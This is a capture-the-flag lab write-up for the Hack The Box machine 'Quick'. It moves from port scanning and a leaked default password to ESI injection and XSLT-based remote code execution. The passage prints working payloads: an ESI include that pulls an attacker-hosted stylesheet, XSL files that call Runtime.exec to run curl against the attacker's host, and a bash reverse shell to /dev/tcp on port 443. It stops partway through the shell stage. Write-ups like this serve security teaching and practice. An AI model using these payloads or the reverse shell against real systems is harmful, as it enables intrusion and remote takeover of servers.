@@ -1,0 +1,1028 @@
+I"�9<h1 id="htb-quick-101010186"><span style="color:red">HTB Quick (10.10.10.186)</span></h1>
+
+<hr />
+
+<h2 id="part-1--initial-enumeration">PART 1 : INITIAL ENUMERATION</h2>
+
+<h3 id="11-nmap">1.1 nmap</h3>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">--min-rate</span> 3000 <span class="nt">-oN</span> nmap-tcp.initial <span class="nt">-p-</span> <span class="nt">-v</span> 10.10.10.186
+
+  PORT     STATE SERVICE
+  22/tcp   open  ssh
+  9001/tcp open  tor-orport
+
+<span class="nv">$ </span>nmap <span class="nt">-oN</span> nmap-tcp <span class="nt">-p</span> 22,9001 <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-v</span> 10.10.10.186
+
+  PORT     STATE SERVICE VERSION
+  22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+  | ssh-hostkey: 
+  |   2048 fb:b0:61:82:39:50:4b:21:a8:62:98:4c:9c:38:82:70 <span class="o">(</span>RSA<span class="o">)</span>
+  |   256 ee:bb:4b:72:63:17:10:ee:08:ff:e5:86:71:fe:8f:80 <span class="o">(</span>ECDSA<span class="o">)</span>
+  |_  256 80:a6:c2:73:41:f0:35:4e:5f:61:a7:6a:50:ea:b8:2e <span class="o">(</span>ED25519<span class="o">)</span>
+  9001/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+  | http-methods: 
+  |_  Supported Methods: GET HEAD POST
+  |_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+  |_http-title: Quick | Broadband Services
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-oN</span> nmap-udp.initial <span class="nt">-sU</span> <span class="nt">-v</span> 10.10.10.186
+
+  PORT    STATE         SERVICE
+  443/udp open|filtered https
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="part-2--port-enumeration">PART 2 : PORT ENUMERATION</h2>
+
+<h3 id="21-tcp-port-9001--http">2.1 TCP PORT 9001 : HTTP</h3>
+
+<p><img src="./screenshots/61_quick/quick_index.png" alt="Quick - index.php" /></p>
+
+<h4 id="211-crawling-indexphp-for-href-links">2.1.1 Crawling <code class="highlighter-rouge">index.php</code> for “href” links:</h4>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl http://10.10.10.186:9001 | <span class="nb">grep</span> <span class="nt">-E</span> <span class="s1">'&lt;a.*href=.*/a&gt;'</span> | <span class="nb">sed</span> <span class="nt">-E</span> <span class="s1">'s/^.*&lt;a.*href="(.*)"&gt;.*/\1/g'</span>
+
+  /login.php
+  https://portal.quick.htb
+  /clients.php
+</code></pre></div></div>
+
+<h4 id="212-directory-brute-forcing-using-gobuster">2.1.2 Directory brute forcing using <code class="highlighter-rouge">gobuster</code></h4>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-o</span> 9001_gobuster.txt <span class="nt">-u</span> http://10.10.10.186:9001 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt <span class="nt">-x</span> php,txt
+
+  /index.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 3353]
+  /search.php           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1]   
+  /home.php             <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 86]  
+  /login.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 4345]
+  /clients.php          <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2698]
+  /db.php               <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 0]   
+  /ticket.php           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 86] 
+</code></pre></div></div>
+
+<h4 id="213-loginphp--login-page">2.1.3 /login.php – Login Page</h4>
+
+<p><img src="./screenshots/61_quick/quick_login.png" alt="Quick - login.php" /></p>
+
+<h4 id="214-clientsphp--client-list">2.1.4 /clients.php – Client List</h4>
+
+<table>
+  <thead>
+    <tr>
+      <th>#</th>
+      <th>Client</th>
+      <th>Country</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>1</td>
+      <td>QConsulting Pvt Ltd</td>
+      <td>UK</td>
+    </tr>
+    <tr>
+      <td>2</td>
+      <td>Darkwing Solutions</td>
+      <td>US</td>
+    </tr>
+    <tr>
+      <td>3</td>
+      <td>Wink</td>
+      <td>UK</td>
+    </tr>
+    <tr>
+      <td>4</td>
+      <td>LazyCoop Pvt Ltd</td>
+      <td>China</td>
+    </tr>
+    <tr>
+      <td>5</td>
+      <td>ScoobyDoo</td>
+      <td>Italy</td>
+    </tr>
+    <tr>
+      <td>6</td>
+      <td>PenguinCrop</td>
+      <td>France</td>
+    </tr>
+  </tbody>
+</table>
+
+<h4 id="215-indexphp--potential-usernames">2.1.5 /index.php – Potential Usernames</h4>
+
+<table>
+  <thead>
+    <tr>
+      <th>Name</th>
+      <th>Company</th>
+      <th>Possible Email</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Tim</td>
+      <td>Qconsulting Pvt Ltd</td>
+      <td>tim@qconsulting.co.uk</td>
+    </tr>
+    <tr>
+      <td>Roy</td>
+      <td>DarkWng Solutions</td>
+      <td>roy@darkwing.us; roy@darkwingsolutions.us</td>
+    </tr>
+    <tr>
+      <td>Elisa</td>
+      <td>Wink Media</td>
+      <td>elisa@wink.co.uk; elisa@winkmedia.co.uk</td>
+    </tr>
+    <tr>
+      <td>James</td>
+      <td>LazyCoop Pvt Ltd</td>
+      <td>james@lazycoop.com.cn</td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="22-udp-port-443--https">2.2 UDP PORT 443 : HTTPS</h3>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>/opt/curl/src/curl <span class="nt">--http3</span> https://portal.quick.htb
+</code></pre></div></div>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;p&gt;</span> Welcome to Quick User Portal<span class="nt">&lt;/p&gt;</span>
+<span class="nt">&lt;ul&gt;</span>
+  <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"index.php"</span><span class="nt">&gt;</span>Home<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
+  <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"index.php?view=contact"</span><span class="nt">&gt;</span>Contact<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
+  <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"index.php?view=about"</span><span class="nt">&gt;</span>About<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
+  <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"index.php?view=docs"</span><span class="nt">&gt;</span>References<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
+<span class="nt">&lt;/ul&gt;</span>
+</code></pre></div></div>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>/opt/curl/src/curl <span class="nt">--http3</span> https://portal.quick.htb/index.php?view<span class="o">=</span>docs
+</code></pre></div></div>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;h1&gt;</span>Quick | References<span class="nt">&lt;/h1&gt;</span>
+<span class="nt">&lt;ul&gt;</span>
+  <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"docs/QuickStart.pdf"</span><span class="nt">&gt;</span>Quick-Start Guide<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
+  <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"docs/Connectivity.pdf"</span><span class="nt">&gt;</span>Connectivity Guide<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
+<span class="nt">&lt;/ul&gt;</span>
+</code></pre></div></div>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>/opt/curl/src/curl <span class="nt">--http3</span> <span class="nt">--output</span> Connectivity.pdf https://portal.quick.htb/docs/Connectivity.pdf
+</code></pre></div></div>
+
+<blockquote>
+  <p>How to Connect ?</p>
+  <ol>
+    <li>Once router is up and running just navigate to http://172.15.0.4/quick_login.jsp</li>
+    <li>You can use your registered email address and Quick4cc3$$ as password.</li>
+    <li>Login and change your password for WiFi and ticketing system.</li>
+    <li>Don’t forget to ping us on chat whenever there is an issue.</li>
+  </ol>
+</blockquote>
+
+<hr />
+
+<h2 id="part-3--exploitation">PART 3 : EXPLOITATION</h2>
+
+<h3 id="31-httpquickhtb9001loginphp">3.1 http[://]quick.htb:9001/login.php</h3>
+
+<ul>
+  <li>
+    <p><strong>USERNAME</strong>: elisa@wink.co.uk</p>
+  </li>
+  <li>
+    <p><strong>PASSWORD</strong>: Quick4cc3$$</p>
+
+    <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ cookie</span><span class="o">=</span><span class="s1">'Cookie: PHPSESSID=4oqa66ge8q5dobkgich32rati2'</span>
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<h3 id="32-httpquickhtb9001homephp">3.2 http[://]quick.htb:9001/home.php</h3>
+
+<p><img src="./screenshots/61_quick/quick_home.png" alt="Quick - home.php" /></p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-H</span> <span class="nv">$cookie</span> <span class="nt">-I</span> http://quick.htb:9001/home.php
+
+  HTTP/1.1 200 OK
+  Server: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+  Expires: Thu, 19 Nov 1981 08:52:00 GMT
+  Cache-Control: no-store, no-cache, must-revalidate
+  Pragma: no-cache
+  Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
+  Via: 1.1 localhost <span class="o">(</span>Apache-HttpClient/4.5.2 <span class="o">(</span>cache<span class="o">))</span>
+  X-Powered-By: Esigate
+  Content-Length: 2
+</code></pre></div></div>
+
+<h3 id="33-httpquickhtb9001ticketphp">3.3 http[://]quick.htb:9001/ticket.php</h3>
+
+<p><img src="./screenshots/61_quick/quick_ticket.png" alt="Quick - ticket.php" /></p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-H</span> <span class="nv">$cookie</span> http://quick.htb:9001/ticket.php
+</code></pre></div></div>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">""</span> <span class="na">method=</span><span class="s">"POST"</span><span class="nt">&gt;</span>
+	<span class="nt">&lt;center&gt;&lt;br</span> <span class="nt">/&gt;&lt;br</span> <span class="nt">/&gt;</span>
+    <span class="nt">&lt;table</span>  <span class="na">border=</span><span class="s">"0"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;tr&gt;</span>
+            <span class="nt">&lt;td</span> <span class="na">align=</span><span class="s">"center"</span> <span class="nt">&gt;</span>Title:<span class="nt">&lt;/td&gt;</span>
+            <span class="nt">&lt;td</span> <span class="na">align=</span><span class="s">"right"</span> <span class="nt">&gt;&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"title"</span><span class="nt">/&gt;&lt;/td&gt;</span>
+        <span class="nt">&lt;/tr&gt;</span>
+		<span class="nt">&lt;tr&gt;</span>
+    		<span class="nt">&lt;td</span> <span class="na">align=</span><span class="s">"center"</span><span class="nt">&gt;</span>Message:<span class="nt">&lt;/td&gt;&lt;td</span> <span class="na">align=</span><span class="s">"right"</span> <span class="nt">&gt;&lt;textarea</span> <span class="na">rows=</span><span class="s">"7"</span> <span class="na">cols=</span><span class="s">"50"</span> <span class="na">name=</span><span class="s">"msg"</span><span class="nt">&gt;</span>Describe your query<span class="nt">&lt;/textarea&gt;&lt;/td&gt;</span>
+    	<span class="nt">&lt;/tr&gt;</span>
+		<span class="nt">&lt;tr&gt;</span>
+    		<span class="nt">&lt;td</span> <span class="na">align=</span><span class="s">"center"</span> <span class="na">colspan=</span><span class="s">"3"</span><span class="nt">&gt;&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span>  <span class="na">value=</span><span class="s">"Submit"</span><span class="nt">/&gt;&lt;/td&gt;</span>
+    	<span class="nt">&lt;/tr&gt;</span>
+	<span class="nt">&lt;/table&gt;</span>
+	<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"id"</span> <span class="na">value=</span><span class="s">"TKT-3874"</span><span class="nt">/&gt;</span>
+<span class="nt">&lt;/form&gt;</span>
+</code></pre></div></div>
+
+<h3 id="34-esi-injection-part-1-rfi">3.4 ESI Injection Part 1 (RFI)</h3>
+
+<ol>
+  <li>Create a file, <strong>something.html</strong>:
+    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">jebidiah was here
+</span></code></pre></div>    </div>
+  </li>
+  <li>Start an HTTP Server using python:
+    <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>python <span class="nt">-m</span> SimpleHTTPServer 80
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Raise ticket with <strong>ESI Server Include</strong> payload that will request <strong>something.html</strong>:</p>
+
+    <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ payload</span><span class="o">=</span><span class="s1">'&lt;esi:include src="http://10.10.14.6/something.html" /&gt;'</span>
+<span class="nv">$ ticket</span><span class="o">=</span><span class="s1">'TKT-0007'</span>
+<span class="nv">$ </span>curl <span class="nt">-X</span> POST <span class="nt">-d</span> <span class="s2">"title=test&amp;msg=</span><span class="nv">$payload</span><span class="s2">&amp;id=</span><span class="nv">$ticket</span><span class="s2">"</span> <span class="nt">-H</span> <span class="nv">$cookie</span> http://quick.htb:9001/ticket.php | tidy
+</code></pre></div>    </div>
+    <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
+	<span class="nx">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">Ticket NO : </span><span class="se">\"</span><span class="s2">TKT-0007</span><span class="se">\"</span><span class="s2"> raised. We will answer you as soon as possible</span><span class="dl">"</span><span class="p">);</span>
+    <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="o">=</span><span class="dl">"</span><span class="s2">/home.php</span><span class="dl">"</span><span class="p">;</span>
+<span class="nt">&lt;/script&gt;</span>
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Search the generated ticket:</p>
+
+    <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-G</span> <span class="nt">-d</span> <span class="s2">"search=</span><span class="nv">$ticket</span><span class="s2">"</span> <span class="nt">-H</span> <span class="nv">$cookie</span> http://quick.htb:9001/search.php | tidy
+</code></pre></div>    </div>
+
+    <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;table</span> <span class="na">border=</span><span class="s">"2"</span> <span class="na">width=</span><span class="s">"100%"</span><span class="nt">&gt;</span>
+	<span class="nt">&lt;tr&gt;</span>
+		<span class="nt">&lt;td</span> <span class="na">style=</span><span class="s">"font-size:180%;"</span><span class="nt">&gt;</span>ID<span class="nt">&lt;/td&gt;</span>
+		<span class="nt">&lt;td</span> <span class="na">style=</span><span class="s">"font-size:180%;"</span><span class="nt">&gt;</span>Title<span class="nt">&lt;/td&gt;</span>
+		<span class="nt">&lt;td</span> <span class="na">style=</span><span class="s">"font-size:180%;"</span><span class="nt">&gt;</span>Description<span class="nt">&lt;/td&gt;</span>
+		<span class="nt">&lt;td</span> <span class="na">style=</span><span class="s">"font-size:180%;"</span><span class="nt">&gt;</span>Status<span class="nt">&lt;/td&gt;</span>
+	<span class="nt">&lt;/tr&gt;</span>
+	<span class="nt">&lt;tr&gt;</span>
+		<span class="nt">&lt;td</span> <span class="na">style=</span><span class="s">"font-size:180%;"</span><span class="nt">&gt;</span>TKT-0007<span class="nt">&lt;/td&gt;</span>
+		<span class="nt">&lt;td</span> <span class="na">style=</span><span class="s">"font-size:180%;"</span><span class="nt">&gt;</span>test<span class="nt">&lt;/td&gt;</span>
+		<span class="nt">&lt;td</span> <span class="na">style=</span><span class="s">"font-size:180%;"</span><span class="nt">&gt;</span>jebidiah was here<span class="nt">&lt;/td&gt;</span>
+		<span class="nt">&lt;td</span> <span class="na">style=</span><span class="s">"font-size:180%;"</span><span class="nt">&gt;</span>open<span class="nt">&lt;/td&gt;</span>
+	<span class="nt">&lt;/tr&gt;</span>
+<span class="nt">&lt;/table&gt;</span>
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Check the HTTP requests:</p>
+
+    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">10.10.10.186 - - [xx/xxx/xxxx xx:xx:xx] "GET /something.html HTTP/1.1" 200 -
+</span></code></pre></div>    </div>
+  </li>
+</ol>
+
+<h3 id="35-esi-injection-part-2-rce">3.5 ESI Injection Part 2 (RCE)</h3>
+
+<ol>
+  <li>
+    <p>Create a file, <strong>test.xsl</strong>:</p>
+
+    <div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" ?&gt;</span>
+<span class="nt">&lt;xsl:stylesheet</span> <span class="na">version=</span><span class="s">"1.0"</span> <span class="na">xmlns:xsl=</span><span class="s">"http://www.w3.org/1999/XSL/Transform"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;xsl:output</span> <span class="na">method=</span><span class="s">"xml"</span> <span class="na">omit-xml-declaration=</span><span class="s">"yes"</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;xsl:template</span> <span class="na">match=</span><span class="s">"/"</span>
+    <span class="na">xmlns:xsl=</span><span class="s">"http://www.w3.org/1999/XSL/Transform"</span>
+    <span class="na">xmlns:rt=</span><span class="s">"http://xml.apache.org/xalan/java/java.lang.Runtime"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;root&gt;</span>
+            <span class="nt">&lt;xsl:variable</span> <span class="na">name=</span><span class="s">"cmd"</span><span class="nt">&gt;</span>
+                <span class="cp">&lt;![CDATA[curl http://10.10.14.6/something.html]]&gt;</span>
+            <span class="nt">&lt;/xsl:variable&gt;</span>
+            <span class="nt">&lt;xsl:variable</span> <span class="na">name=</span><span class="s">"rtObj"</span> <span class="na">select=</span><span class="s">"rt:getRuntime()"</span><span class="nt">/&gt;</span>
+            <span class="nt">&lt;xsl:variable</span> <span class="na">name=</span><span class="s">"process"</span> <span class="na">select=</span><span class="s">"rt:exec($rtObj, $cmd)"</span><span class="nt">/&gt;</span>
+            Process: <span class="nt">&lt;xsl:value-of</span> <span class="na">select=</span><span class="s">"$process"</span><span class="nt">/&gt;</span>
+            Command: <span class="nt">&lt;xsl:value-of</span> <span class="na">select=</span><span class="s">"$cmd"</span><span class="nt">/&gt;</span>
+        <span class="nt">&lt;/root&gt;</span>
+    <span class="nt">&lt;/xsl:template&gt;</span>
+<span class="nt">&lt;/xsl:stylesheet&gt;</span>
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Start an HTTP Server using python:</p>
+
+    <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>python <span class="nt">-m</span> SimpleHTTPServer 80
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Raise ticket with <strong>ESI Server Include</strong> payload that will request <strong>test.xsl</strong>:</p>
+
+    <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ payload</span><span class="o">=</span><span class="s1">'&lt;esi:include src="http://localhost:9001" stylesheet="http://10.10.14.6/test3.xsl"&gt;&lt;/esi:include&gt;'</span>
+<span class="nv">$ ticket</span><span class="o">=</span><span class="s1">'TKT-0008'</span>
+<span class="nv">$ </span>curl <span class="nt">-X</span> POST <span class="nt">-d</span> <span class="s2">"title=test&amp;msg=</span><span class="nv">$payload</span><span class="s2">&amp;id=</span><span class="nv">$ticket</span><span class="s2">"</span> <span class="nt">-H</span> <span class="nv">$cookie</span> http://quick.htb:9001/ticket.php | tidy
+</code></pre></div>    </div>
+
+    <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
+	<span class="nx">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">Ticket NO : </span><span class="se">\"</span><span class="s2">TKT-0008</span><span class="se">\"</span><span class="s2"> raised. We will answer you as soon as possible</span><span class="dl">"</span><span class="p">);</span>
+    <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="o">=</span><span class="dl">"</span><span class="s2">/home.php</span><span class="dl">"</span><span class="p">;</span>
+<span class="nt">&lt;/script&gt;</span>
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Search the generated ticket:</p>
+
+    <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-G</span> <span class="nt">-d</span> <span class="s2">"search=</span><span class="nv">$ticket</span><span class="s2">"</span> <span class="nt">-H</span> <span class="nv">$cookie</span> http://quick.htb:9001/search.php | tidy
+</code></pre></div>    </div>
+
+    <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;table</span> <span class="na">border=</span><span class="s">"2"</span> <span class="na">width=</span><span class="s">"100%"</span><span class="nt">&gt;</span>
+	<span class="nt">&lt;tr&gt;</span>
+        <span class="nt">&lt;td</span> <span class="na">style=</span><span class="s">"font-size:180%;"</span><span class="nt">&gt;</span>ID<span class="nt">&lt;/td&gt;</span>
+        <span class="nt">&lt;td</span> <span class="na">style=</span><span class="s">"font-size:180%;"</span><span class="nt">&gt;</span>Title<span class="nt">&lt;/td&gt;</span>
+        <span class="nt">&lt;td</span> <span class="na">style=</span><span class="s">"font-size:180%;"</span><span class="nt">&gt;</span>Description<span class="nt">&lt;/td&gt;</span>
+        <span class="nt">&lt;td</span> <span class="na">style=</span><span class="s">"font-size:180%;"</span><span class="nt">&gt;</span>Status<span class="nt">&lt;/td&gt;</span>
+	<span class="nt">&lt;/tr&gt;</span>
+    <span class="nt">&lt;tr&gt;</span>
+        <span class="nt">&lt;td</span> <span class="na">style=</span><span class="s">"font-size:180%;"</span><span class="nt">&gt;</span>TKT-0014<span class="nt">&lt;/td&gt;</span>
+        <span class="nt">&lt;td</span> <span class="na">style=</span><span class="s">"font-size:180%;"</span><span class="nt">&gt;</span>test<span class="nt">&lt;/td&gt;</span>
+        <span class="nt">&lt;td</span> <span class="na">style=</span><span class="s">"font-size:180%;"</span><span class="nt">&gt;</span>
+        	Process: Process[pid=2807, exitValue="not exited"] 
+            Command: curl http://10.10.14.6/something.html
+        <span class="nt">&lt;/td&gt;</span>
+        <span class="nt">&lt;td</span> <span class="na">style=</span><span class="s">"font-size:180%;"</span><span class="nt">&gt;</span>open<span class="nt">&lt;/td&gt;</span>
+    <span class="nt">&lt;/tr&gt;</span>
+<span class="nt">&lt;/table&gt;</span>
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Check the HTTP requests:</p>
+
+    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">10.10.10.186 - - [xx/xxx/xxxx xx:xx:xx] "GET /test3.xsl HTTP/1.1" 200 -
+10.10.10.186 - - [xx/xxx/xxxx xx:xx:xx] "GET /something.html HTTP/1.1" 200 -
+</span></code></pre></div>    </div>
+  </li>
+</ol>
+
+<hr />
+
+<h2 id="part-4--generating-a-shell">PART 4 : GENERATING A SHELL</h2>
+
+<h3 id="41-reverse-shell">4.1 Reverse Shell</h3>
+
+<ol>
+  <li>Write a reverse shell on a file, <strong>index.html</strong>:
+    <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-c</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/10.10.14.6/443 0&gt;&amp;1'</span>
+</code></pre></div>    </div>
+  </li>
+  <li>Create a stager file for the reverse shell – <strong>stager.xsl</strong>:
+    <div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" ?&gt;</span>
+<span class="nt">&lt;xsl:stylesheet</span> <span class="na">version=</span><span class="s">"1.0"</span> <span class="na">xmlns:xsl=</span><span class="s">"http://www.w3.org/1999/XSL/Transform"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;xsl:output</span> <span class="na">method=</span><span class="s">"xml"</span> <span class="na">omit-xml-declaration=</span><span class="s">"yes"</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;xsl:template</span> <span class="na">match=</span><span class="s">"/"</span>
+    <span class="na">xmlns:xsl=</span><span class="s">"http://www.w3.org/1999/XSL/Transform"</span>
+    <span class="na">xmlns:rt=</span><span class="s">"http://xml.apache.org/xalan/java/java.lang.Runtime"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;root&gt;</span>
+            <span class="nt">&lt;xsl:variable</span> <span class="na">name=</span><span class="s">"cmd"</span><span class="nt">&gt;</span>
+                <span class="cp">&lt;![CDATA[curl --output /tmp/rev http://10.10.14.6]]&gt;</span>
+            <span class="nt">&lt;/xsl:variable&gt;</span>
+            <span class="nt">&lt;xsl:variable</span> <span class="na">name=</span><span class="s">"rtObj"</span> <span class="na">select=</span><span class="s">"rt:getRuntime()"</span><span class="nt">/&gt;</span>
+            <span class="nt">&lt;xsl:variable</span> <span class="na">name=</span><span class="s">"process"</span> <span class="na">select=</span><span class="s">"rt:exec($rtObj, $cmd)"</span><span class="nt">/&gt;</span>
+            Process: <span class="nt">&lt;xsl:value-of</span> <span class="na">select=</span><span class="s">"$process"</span><span class="nt">/&gt;</span>
+            Command: <span class="nt">&lt;xsl:value-of</span> <span class="na">select=</span><span class="s">"$cmd"</span><span class="nt">/&gt;</span>
+        <span class="nt">&lt;/root&gt;</span>
+    <span class="nt">&lt;/xsl:template&gt;</span>
+<span class="nt">&lt;/xsl:stylesheet&gt;</span>
+</code></pre></div>    </div>
+  </li>
+  <li>Raise a ticket that will request <strong>stager.xsl</strong>:
+    <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ payload</span><span class="o">=</span><span class="s1">'&lt;esi:include src="http://localhost:9001" stylesheet="http://10.10.14.6/stager.xsl"&gt;&lt;/esi:include&gt;'</span>
+<span class="nv">$ ticket</span><span class="o">=</span><span class="s1">'TKT-0069'</span>
+<span class="nv">$ </span>curl <span class="nt">-X</span> POST <span class="nt">-d</span> <span class="s2">"title=test&amp;msg=</span><span class="nv">$payload</span><span class="s2">&amp;id=</span><span class="nv">$ticket</span><span class="s2">"</span> <span class="nt">-H</span> <span class="nv">$cookie</span> http://quick.htb:9001/ticket.php
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Search the generated ticket then view the HTTP requests on the <code class="highlighter-rouge">python</code> server:</p>
+
+    <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-G</span> <span class="nt">-d</span> <span class="s2">"search=</span><span class="nv">$ticket</span><span class="s2">"</span> <span class="nt">-H</span> <span class="nv">$cookie</span> http://quick.htb:9001/search.php | tidy
+</code></pre></div>    </div>
+
+    <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;table</span> <span class="na">border=</span><span class="s">"2"</span> <span class="na">width=</span><span class="s">"100%"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;tr&gt;</span>
+        <span class="nt">&lt;td</span> <span class="na">style=</span><span class="s">"font-size:180%;"</span><span class="nt">&gt;</span>ID<span class="nt">&lt;/td&gt;</span>
+        <span class="nt">&lt;td</span> <span class="na">style=</span><span class="s">"font-size:180%;"</span><span class="nt">&gt;</span>Title<span class="nt">&lt;/td&gt;</span>
+        <span class="nt">&lt;td</span> <span class="na">style=</span><span class="s">"font-size:180%;"</span><span class="nt">&gt;</span>Description<span class="nt">&lt;/td&gt;</span>
+        <span class="nt">&lt;td</span> <span class="na">style=</span><span class="s">"font-size:180%;"</span><span class="nt">&gt;</span>Status<span class="nt">&lt;/td&gt;</span>
+    <span class="nt">&lt;/tr&gt;</span>
+    <span class="nt">&lt;tr&gt;</span>
+        <span class="nt">&lt;td</span> <span class="na">style=</span><span class="s">"font-size:180%;"</span><span class="nt">&gt;</span>TKT-0069<span class="nt">&lt;/td&gt;</span>
+        <span class="nt">&lt;td</span> <span class="na">style=</span><span class="s">"font-size:180%;"</span><span class="nt">&gt;</span>test<span class="nt">&lt;/td&gt;</span>
+        <span class="nt">&lt;td</span> <span class="na">style=</span><span class="s">"font-size:180%;"</span><span class="nt">&gt;</span>
+            Process: Process[pid=3448, exitValue="not exited"] 
+            Command: curl --output /tmp/rev http://10.10.14.6
+        <span class="nt">&lt;/td&gt;</span>
